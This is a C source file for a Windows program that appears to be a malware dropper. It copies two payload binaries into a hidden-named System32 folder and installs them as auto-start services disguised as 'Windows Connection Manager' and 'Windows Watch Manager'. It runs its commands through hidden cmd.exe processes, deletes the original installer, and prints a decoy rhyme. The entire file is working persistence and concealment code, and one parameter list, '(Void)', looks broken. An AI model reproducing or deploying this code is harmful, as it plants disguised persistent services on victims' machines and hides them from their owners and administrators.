#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN // disable out-of-date parts of Windows SDK

#include <winsock2.h> // for windows.h
#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <shlwapi.h>
#include <time.h>
#include <locale.h>
#include <wininet.h>
#include <stdarg.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")


SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

// #define CONSOLE_LOGGING

#if defined(CONSOLE_LOGGING)
    #define Log(...) wprintf(__VA_ARGS__)
#else
    #define Log(...) ((void)0)
#endif

#define RUN_RELOCATED_INSTALLER L"pjo"

#define SVC_DIR                 L"C:\\Windows\\System32\\ts-TS"

#define INSTALLER_DIR           SVC_DIR L"\\.oij"
#define INSTALLER_PATH          INSTALLER_DIR L"\\sivu.exe"
#define KILLIT_PATH             INSTALLER_DIR L"\\dfgv"
#define HERMES_STORED_PATH      INSTALLER_DIR L"\\axdx"
#define WATCHER_STORED_PATH     INSTALLER_DIR L"\\dkjf"

#define HERMES_SEUDONAME        L"biba.boba"
#define HERMES_PATH             L"C:\\Windows\\System32\\wconm.exe"
#define HERMES_NAME             L"Windows Connection Manager"
#define HERMES_DESCRIPTION      L"Manages connection actions for quality of service."


#define WATCHER_SEUDONAME       L"boba.boba"
#define WATCHER_PATH            L"C:\\Windows\\System32\\winwatchm.exe"
#define WATCHER_NAME            L"Windows Watch Manager"
#define WATCHER_DESCRIPTION     L"Internal watch synchronizer."

// int bibictivity() {
//     return 0;
// }

BOOL FileExists(wchar_t* filePath) {
    DWORD attrs = GetFileAttributesW(filePath);
    return (attrs != INVALID_FILE_ATTRIBUTES) && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
}

BOOL IsServiceInstalled(wchar_t* serviceName) {
    SC_HANDLE scm = NULL;
    SC_HANDLE service = NULL;
    BOOL exists = FALSE;

    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm == NULL) {
        Log(L"[-] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }


    service = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
    if (service != NULL) {
        exists = TRUE;
        CloseServiceHandle(service);
    } else {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_DOES_NOT_EXIST) {
            Log("[-] OpenService failed with error: %lu\n", err);
        }
        // service doesnt exist
    }

    CloseServiceHandle(scm);
    return exists;
}

int InstallService(wchar_t* servicePath, wchar_t* svc_name,  wchar_t* svc_display_name, SERVICE_DESCRIPTIONW *psd) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        Log(L"[-] OpenSCManagerW failed\n");
        return 1;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCManager, svc_name, svc_display_name, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        servicePath, NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        CloseServiceHandle(hSCManager);
        Log(L"[-] CreateServiceW failed\n");
        return 1;
    }

    if (!ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, psd)) {
        Log(L"[-] ChangeServiceConfig2W failed\n");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int StartService_(wchar_t* svc_name) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        return 1;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, svc_name, SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return 1;
    }

    if (!StartServiceW(hService, 0, NULL)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return 1;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int CreateDir(const wchar_t* path) {
    if (CreateDirectoryW(path, NULL)) {
        return 0;
    }

    DWORD error = GetLastError();
    if (error == ERROR_ALREADY_EXISTS) {
        DWORD attrs = GetFileAttributesW(path);
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return 0;
        } else {
            if (!DeleteFileW(path)) {
                DWORD err = GetLastError();
                Log(L"[-] DeleteFileW failed: %lu\n", err);
                return 1;
            }
            if (CreateDirectoryW(path, NULL)) {
                //Log(L"[+] FtpCreateDir succeeded after deleting file of the same name\n");
                return 0;
            }
            else {
                error = GetLastError();
                Log(L"[-] CreateDirectoryW failed: %lu\n", error);
                return 1;
            }
        }
    }

    // other error :/
    Log(L"[-] CreateDirectoryW failed: %lu\n", error);
    return 1;
}

int WriteWideStrToFile(wchar_t* str, wchar_t* killit_file)
{
    HANDLE hFile = CreateFileW(
        killit_file,                      
        GENERIC_WRITE,                   
        0,                                
        NULL,                             
        CREATE_ALWAYS,                    
        FILE_ATTRIBUTE_NORMAL,           
        NULL                              
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        Log(L"[-] CreateFileW failed: %lu\n", GetLastError());
        return 1;
    }

    DWORD bytesToWrite = (DWORD)(wcslen(str) * sizeof(wchar_t));
    DWORD bytesWritten = 0;

    BOOL result = WriteFile(
        hFile,              
        str,                
        bytesToWrite,      
        &bytesWritten,     
        NULL               
    );

    if (!result) {
        Log(L"[-] WriteFile failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);
    return 0;
}

int ReadWideStringFromFile(wchar_t* filePath, wchar_t* wstr, size_t bufferSize) {
    HANDLE hFile = CreateFileW(
        filePath,                 
        GENERIC_READ,             
        FILE_SHARE_READ,          
        NULL,                     
        OPEN_EXISTING,            
        FILE_ATTRIBUTE_NORMAL,    
        NULL                      
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        Log(L"[-] CreateFileW: %lu\n", GetLastError());
        return 1;
    }

    DWORD bytesRead = 0;
    BOOL result = ReadFile(hFile, wstr, bufferSize*sizeof(wchar_t), &bytesRead, NULL);
    if (!result) {
        Log(L"[-] ReadFile failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    size_t wcharCount = bytesRead / sizeof(wchar_t);
    wstr[wcharCount] = L'\0';

    return 0;
}

int delInstallerExe(void)
{ 
    wchar_t installer_exe[MAX_PATH];
    DWORD length;
    length = GetModuleFileNameW(NULL, installer_exe, MAX_PATH);
    if (length <= 0) {
        Log(L"[-] GetModuleFileNameW failed\n");
        return 1;
    }

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    wchar_t cmdLine[1024];
    wsprintfW(cmdLine, L"C:\\Windows\\System32\\cmd.exe /c del /f /q \"%s\"", installer_exe);


    BOOL success = CreateProcessW(
        NULL,
        cmdLine,
        NULL, NULL,
        FALSE,                // inherit no handles
        DETACHED_PROCESS | CREATE_NO_WINDOW,     // tasty
        NULL, NULL,
        &si, &pi
    );

    if (success) {
        Log(L"[+] CreateProcessW succeeded\n");
        return 0;
    }
    Log(L"[+] CreateProcessW failed\n");
    return 1;
}

int relocateInstaller(void)
{
    wchar_t curDir[MAX_PATH];
    wchar_t installer_exe[MAX_PATH];
    wchar_t hermes_exe[MAX_PATH];
    wchar_t watcher_exe[MAX_PATH];
    BOOL installer_flg = FALSE, hermes_flg = FALSE, watcher_flg = FALSE;
    BOOL result;
    DWORD length;


    if (CreateDir(SVC_DIR)) {
        return 1;
    }

    if (CreateDir(INSTALLER_DIR)) {
        return 1;
    }

    length = GetModuleFileNameW(NULL, installer_exe, MAX_PATH);
    if (length) {
        result = CopyFileW(installer_exe, INSTALLER_PATH, FALSE);
        if (result) {
            installer_flg = TRUE;
        }
        else {
            Log(L"[-] CopyFileW failed: %lu\n", GetLastError());
        }
        WriteWideStrToFile(installer_exe, KILLIT_PATH);
    }
    else {
        Log(L"[-] GetModuleFileNameW failed\n");
    }
    

    length = GetCurrentDirectoryW(MAX_PATH, curDir);
    if (length == 0) {
        Log(L"[-] GetCurrentDirectoryW failed\n");
        return 1;
    }
    curDir[length] = L'\\';
    curDir[length+1] = 0;


    if (PathCombineW(hermes_exe, curDir, HERMES_SEUDONAME)) {
        result = CopyFileW(hermes_exe, HERMES_STORED_PATH, FALSE);
        if (result) {
            hermes_flg = TRUE;
        }
        else {
            Log(L"[-] CopyFileW failed: %lu\n", GetLastError());
        }
    }
    else {
        Log(L"[-] PathCombineW failed\n");
    }

    if (PathCombineW(watcher_exe, curDir, WATCHER_SEUDONAME)) {
        result = CopyFileW(watcher_exe, WATCHER_STORED_PATH, FALSE);
        if (result) {
            watcher_flg = TRUE;
        }
        else {
            Log(L"[-] CopyFileW failed: %lu\n", GetLastError());
        }
    }
    else {
        Log(L"[-] PathCombineW failed\n");
    }

    if (hermes_flg) {
        result = DeleteFileW(hermes_exe);
        if (!result) {
            Log(L"[-] DeleteFileW failed: %s\n", hermes_exe);
        }
    }
        
    if (watcher_flg) {
        result = DeleteFileW(watcher_exe);
        if (!result) {
            Log(L"[-] DeleteFileW failed: %s\n", watcher_exe);
        }
    }

    delInstallerExe();
  
    return 0;
}

int runRelocatedInstaller(Void)
{
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe /c " INSTALLER_PATH L" " RUN_RELOCATED_INSTALLER;

    BOOL success = CreateProcessW(
        NULL,
        cmdLine,
        NULL, NULL,
        FALSE,                //  do not inherit the handles
        DETACHED_PROCESS | CREATE_NO_WINDOW,     // exactly what we need
        NULL, NULL,
        &si, &pi
    );

    if (success) {
        Log(L"[+] CreateProcessW succeeded\n");
        return 0;
    }
    Log(L"[+] CreateProcessW failed\n");
    return 1;
}

void runInstaller(void)
{
    BOOL hermes_installed = FALSE;
    SERVICE_DESCRIPTIONW sd;
    wchar_t killit_file[MAX_PATH];
    if (!ReadWideStringFromFile(KILLIT_PATH, killit_file, MAX_PATH)) {
        if (!DeleteFileW(killit_file)) {
            Log(L"[-] DeleteFileW failed: %s\n", killit_file);
        }
        DeleteFileW(KILLIT_PATH);
    }

    if (FileExists(HERMES_STORED_PATH)) {
        sd.lpDescription = HERMES_DESCRIPTION;
        if (InstallService(HERMES_PATH, HERMES_NAME, HERMES_NAME, &sd)) {
            Log(L"[-] InstallService failed: %s, %s, %s\n", 
                HERMES_PATH, HERMES_NAME, sd.lpDescription);
        }
        else {
            if (!CopyFileW(HERMES_STORED_PATH, HERMES_PATH, FALSE)) {
                Log(L"[-] CopyFileW failed: %lu\n", GetLastError());
            }
            else {
                hermes_installed = TRUE;
            }
        }
    }
    

    if (FileExists(WATCHER_STORED_PATH)) {
        sd.lpDescription = WATCHER_DESCRIPTION;
        if (InstallService(WATCHER_PATH, WATCHER_NAME, WATCHER_NAME, &sd)) {
            Log(L"[-] InstallService failed: %s, %s, %s\n", 
                WATCHER_PATH, WATCHER_NAME, sd.lpDescription);
        }
        else {
            if (!CopyFileW(WATCHER_STORED_PATH, WATCHER_PATH, FALSE)) {
                Log(L"[-] CopyFileW failed: %lu\n", GetLastError());
            }
        }
    }

    if (hermes_installed) StartService_(HERMES_NAME);
}

int wmain(int argc, wchar_t** argv) {

    if (IsServiceInstalled(HERMES_NAME)) {
        delInstallerExe();
        printf("[*] no need to run it twice\n");
        return 0;
    }

    if (argc == 1) {
        if (relocateInstaller())
            return 0;
        
        runRelocatedInstaller();
        printf("dible bible\n"
               "            didle doo\n"
               "bible booble\n"
               "            bible boo\n");

        return 0;
    }
    
    if (argc == 2 && !wcscmp(argv[1], RUN_RELOCATED_INSTALLER)) {
        runInstaller();
    }
 
    return 0;
}